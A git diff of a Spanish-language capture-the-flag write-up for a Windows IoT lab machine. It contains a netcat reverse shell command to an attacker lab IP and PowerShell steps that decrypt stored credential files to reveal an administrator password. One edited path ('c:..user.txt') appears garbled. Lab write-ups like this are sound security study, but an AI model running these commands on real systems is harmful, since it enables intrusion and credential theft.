@@ -407,10 +407,10 @@ Entonces podemos usar esto para validar:
 También de la lectura previa entendí que si no somos el propietario del archivo, lo más probable es que obtengamos algún tipo de error, en nuestro caso al intentar jugar con `user.txt` y `iot-admin.xml`, obtenemos:
 
 ```powershell
-PS C:\Data\Users\app> $credential = Import-CliXml -Path c:\Data\Users\app\user.txt
+PS c:\Data\Users\app> $credential = Import-CliXml -Path c:..user.txt
 Import-CliXml : Error occurred during a cryptographic operation.
 At line:1 char:15
-+ $credential = Import-CliXml -Path c:\Data\Users\app\user.txt
++ $credential = Import-CliXml -Path c:..user.txt
 +               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     + CategoryInfo          : NotSpecified: (:) [Import-Clixml], Cryptographic 
    Exception
@@ -432,22 +432,16 @@ Hacemos el mismo procedimiento que con el usuario **administrator**. Entramos al
 
 ```powershell
 Command> echo %userprofile%
-C:\Data\Users\app 
-
 Command> c:\Data\Users\DefaultAccount\nc64.exe 10.10.14.188 4435 -e cmd.exe
 Access is denied.
 ```
 
 Muy bien, entonces movamos el binario a una carpeta de la que sea propietario el usuario **app**. Lo hice con la sesión que tenía abierta de **SYSTEM**, cerré la de **administrator** :(
 
-```powershell
-C:\Data\Users\app\Videos>copy c:\Data\users\DefaultAccount\nc64.exe nc64.exe
-```
-
-Y ahora en el portal:
+Lo movemos a `c:\Data\Users\app\Videos` y despues en el portal:
 
 ```powershell
->c:\Data\Users\app\Videos\nc64.exe 10.10.14.188 4435 -e cmd.exe
+c:\Data\Users\app\Videos\nc64.exe 10.10.14.188 4435 -e cmd.exe
 ```
 
 Veamos la flag de `user.txt`:
@@ -458,12 +452,9 @@ Bien, ahora quiero probar si hice todo al revés o si daba igual <>_<>
 
 ```powershell
 PS C:\Data\Users\app> $credential = Import-CliXml -Path c:\Data\Users\app\iot-admin.xml
-$credential = Import-CliXml -Path c:\Data\Users\app\iot-admin.xml
 PS C:\Data\Users\app> $credential.GetNetworkCredential().Username
-$credential.GetNetworkCredential().Username
 administrator
 PS C:\Data\Users\app> $credential.GetNetworkCredential().Password
-$credential.GetNetworkCredential().Password
 _1nt3rn37ofTh1nGz
 PS C:\Data\Users\app> 
 ```
